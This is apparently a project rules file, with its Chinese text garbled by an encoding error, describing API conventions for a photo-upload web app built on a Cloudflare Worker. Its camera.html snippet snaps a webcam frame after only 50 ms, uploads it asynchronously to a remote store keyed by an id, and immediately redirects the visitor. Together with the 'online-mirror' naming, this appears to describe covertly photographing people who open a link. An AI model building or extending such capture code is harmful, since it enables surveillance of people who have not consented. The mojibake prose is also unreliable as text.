---
description: APIé…ç½®å’Œè¯·æ±‚è§„èŒƒ
---

# API é…ç½®å’Œè¯·æ±‚è§„èŒƒ

## ğŸ”§ API é…ç½®

æ‰€æœ‰ API è¯·æ±‚å¿…é¡»é€šè¿‡ [config.js](mdc:config.js) ä¸­å®šä¹‰çš„åœ°å€ï¼š

```javascript
// config.js
const API_BASE_URL = "https://api.zk9999902.dpdns.org";

window.API_CONFIG = {
  BASE_URL: API_BASE_URL,
  UPLOAD: `${API_BASE_URL}/api/upload`,
  PHOTOS: `${API_BASE_URL}/api/photos`,
};
```

## âœ… æ­£ç¡®çš„ API è°ƒç”¨æ–¹å¼

### å¼•å…¥é…ç½®

åœ¨ HTML æ–‡ä»¶ä¸­å…ˆå¼•å…¥ config.jsï¼š

```html
<script src="config.js"></script>
<script>
  // ç„¶åæ‰èƒ½ä½¿ç”¨ window.API_CONFIG
</script>
```

### ä¸Šä¼ ç…§ç‰‡

```javascript
fetch(window.API_CONFIG.UPLOAD, {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    id: id,
    image: imageData,
  }),
});
```

### è·å–ç…§ç‰‡åˆ—è¡¨

```javascript
fetch(
  `${window.API_CONFIG.PHOTOS}?id=${encodeURIComponent(
    id
  )}&page=${page}&limit=${limit}`
);
```

### åˆ é™¤ç…§ç‰‡

```javascript
fetch(`${window.API_CONFIG.PHOTOS}?id=${encodeURIComponent(id)}`, {
  method: "DELETE",
});
```

## âŒ é”™è¯¯çš„æ–¹å¼

```javascript
// âŒ ä¸è¦ä½¿ç”¨ç›¸å¯¹è·¯å¾„
fetch("/api/upload"); // é”™è¯¯ï¼šä¼šè¯·æ±‚ Pages åŸŸåè€Œä¸æ˜¯ Worker

// âŒ ä¸è¦ç¡¬ç¼–ç  API åœ°å€
fetch("https://online-mirror.1334132303.workers.dev/api/upload"); // é”™è¯¯ï¼šä¸ä¾¿äºç»´æŠ¤
```

## ğŸš€ æ€§èƒ½ä¼˜åŒ–

### å¼‚æ­¥ä¸Šä¼ ï¼ˆæ‹ç…§é¡µé¢ï¼‰

åœ¨ [camera.html](mdc:camera.html) ä¸­ï¼Œæ‹ç…§åç«‹å³è·³è½¬ï¼Œå¼‚æ­¥ä¸Šä¼ ï¼š

```javascript
// æ‹ç…§
context.drawImage(video, 0, 0, 480, 640);
const imageData = canvas.toDataURL("image/png");

// å¼‚æ­¥ä¸Šä¼ ï¼ˆä¸ç­‰å¾…ç»“æœï¼‰
fetch(window.API_CONFIG.UPLOAD, {
  method: "POST",
  body: JSON.stringify({ id, image: imageData }),
}).catch((error) => console.error(error));

// ç«‹å³è·³è½¬
window.location.href = redirectUrl;
```

### æœ€å°å»¶è¿Ÿ

```javascript
// âœ… ä½¿ç”¨æœ€å°å¿…è¦å»¶è¿Ÿ
setTimeout(() => {
  // æ‹ç…§
}, 50); // ä»…50ms
```

## ğŸ”’ CORS é…ç½®

Worker API ([worker.js](mdc:worker.js)) å·²é…ç½® CORS å¤´ï¼š

```javascript
const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, DELETE, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
};
```

æ‰€æœ‰å“åº”å¿…é¡»åŒ…å«è¿™äº›å¤´éƒ¨ã€‚

## ğŸ“‹ API ç«¯ç‚¹

### POST /api/upload

ä¸Šä¼ ç…§ç‰‡åˆ° R2 å­˜å‚¨

**è¯·æ±‚ä½“**:

```json
{
  "id": "ç”¨æˆ·ID",
  "image": "data:image/png;base64,..."
}
```

### GET /api/photos

è·å–ç…§ç‰‡åˆ—è¡¨ï¼ˆåˆ†é¡µï¼‰

**æŸ¥è¯¢å‚æ•°**:

- `id`: ç”¨æˆ· ID
- `page`: é¡µç ï¼ˆä» 0 å¼€å§‹ï¼‰
- `limit`: æ¯é¡µæ•°é‡

### DELETE /api/photos

åˆ é™¤æŒ‡å®š ID çš„æ‰€æœ‰ç…§ç‰‡

**æŸ¥è¯¢å‚æ•°**:

- `id`: ç”¨æˆ· ID

## âš ï¸ æ³¨æ„äº‹é¡¹

1. æ‰€æœ‰ API è¯·æ±‚éƒ½è¦å¤„ç†é”™è¯¯æƒ…å†µ
2. ä½¿ç”¨ `encodeURIComponent()` ç¼–ç  URL å‚æ•°
3. å¼‚æ­¥æ“ä½œè¦ä½¿ç”¨ `async/await` æˆ– `.catch()` å¤„ç†é”™è¯¯
4. Worker å’Œ Pages æ˜¯ç‹¬ç«‹éƒ¨ç½²çš„ï¼Œå¿…é¡»ä½¿ç”¨å®Œæ•´ URL
